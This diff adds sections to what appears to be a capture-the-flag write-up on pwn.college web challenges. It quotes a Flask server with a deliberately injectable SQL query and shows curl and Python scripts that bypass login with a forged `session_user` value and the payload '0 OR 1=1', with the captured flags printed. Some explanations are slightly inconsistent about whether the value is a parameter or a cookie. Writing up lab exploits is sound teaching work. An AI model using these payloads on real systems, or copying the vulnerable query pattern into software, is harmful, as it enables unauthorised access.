@@ -804,7 +804,7 @@ if username == "admin":
     show_flag()
 ```
 
-This blindly trusts the user-controlled session_user parameter with no validation.
+This blindly trusts the user-controlled `session_user` parameter with no validation.
 This insecure session handling causes IDOR.
 
 ### IDOR
@@ -891,4 +891,192 @@ def challenge_get():
 app.secret_key = os.urandom(8)
 app.config['SERVER_NAME'] = f"challenge.localhost:80"
 app.run("challenge.localhost", 80)
+```
+
+This challenge checks if we have provided the correct credentials for the `admin` user.
+After successful login, the app redirects with:
+
+```py title="/challenge/server" showLineNumbers
+return redirect(f"/?session_user={username}")
+```
+
+Then in the GET route, it uses:
+
+```py title="/challenge/server" showLineNumbers
+username = request.args.get("session_user")
+if username == "admin":
+    show_flag()
+```
+
+This blindly trusts the user-controlled `session_user` cookie with no validation.
+This insecure session handling causes IDOR.
+
+### IDOR
+
+```
+hacker@web-security~authentication-bypass-2:/$ curl --cookie "session_user=admin" "challenge.localhost:80"
+<html><body>Hello, admin!<br>Here is your flag: pwn.college{8k0g9-nWoB8OdGEMFi2uFNSnzpO.dJzN1YDL4ITM0EzW}
+
+        <hr>
+        <form method=post>
+        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
+        </form>
+        </body></html>
+```
+
+&nbsp;
+
+## SQLi 1
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import random
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as pin""", [random.randrange(2**32, 2**63)])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, 1337 as pin""")
+
+
+@app.route("/session", methods=["POST"])
+def challenge_post():
+    username = flask.request.form.get("identity")
+    pin = flask.request.form.get("pin")
+    if not username:
+        flask.abort(400, "Missing `identity` form parameter")
+    if not pin:
+        flask.abort(400, "Missing `pin` form parameter")
+
+    if pin[0] not in "0123456789":
+        flask.abort(400, "Invalid pin")
+
+    try:
+        # https://www.sqlite.org/lang_select.html
+        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }"
+        print(f"DEBUG: {query=}")
+        user = db.execute(query).fetchone()
+    except sqlite3.Error as e:
+        flask.abort(500, f"Query: {query}\nError: {e}")
+
+    if not user:
+        flask.abort(403, "Invalid username or pin")
+
+    flask.session["user"] = username
+    return flask.redirect(flask.request.path)
+
+
+@app.route("/session", methods=["GET"])
+def challenge_get():
+    if not (username := flask.session.get("user", None)):
+        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
+    else:
+        page = f"<html><body>Hello, {username}!"
+        if username == "admin":
+            page += "<br>Here is your flag: " + open("/flag").read()
+
+    return (
+        page
+        + """
+        <hr>
+        <form method=post>
+        User:<input type=text name=identity>Pin:<input type=text name=pin><input type=submit value=Submit>
+        </form>
+        </body></html>
+    """
+    )
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```py title="~/script.py" showLineNumbers
+import requests
+
+url = "http://challenge.localhost:80/session"
+data = {
+    "identity": "guest",
+    "pin": int("1337")
+}
+
+response = requests.post(url, data = data)
+print(response.text)
+```
+
+```
+hacker@web-security~sqli-1:/$ python ~/script.py 
+<html><body>Hello, guest!
+        <hr>
+        <form method=post>
+        User:<input type=text name=identity>Pin:<input type=text name=pin><input type=submit value=Submit>
+        </form>
+        </body></html>
+```
+
+### SQL injection
+
+Let's try the following credentials:
+
+| identity | pin |
+|-|-|
+| admin | 0 OR 1=1 |
+
+The resultant SQL query will be:
+
+```sql
+SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 0 OR 1=1
+```
+
+Since the result of `1=1` is always true/1 and anything OR with 1 is 1, the query will always be executed even if the password isn't password.
+
+```py title="~/script.py" showLineNumbers
+import requests
+
+url = "http://challenge.localhost:80/session"
+data = {
+    "identity": "admin",
+    "pin": "0 OR 1=1"
+}
+
+with requests.Session() as session:
+    response = session.post(url, data = data)
+    print(response.text)
+```
+
+```
+hacker@web-security~sqli-1:/$ python ~/script.py
+<html><body>Hello, admin!<br>Here is your flag: pwn.college{0RQz9ukgGE_ktokPgDEKWsxghoL.dNzN1YDL4ITM0EzW}
+
+        <hr>
+        <form method=post>
+        User:<input type=text name=identity>Pin:<input type=text name=pin><input type=submit value=Submit>
+        </form>
+        </body></html>
 ```
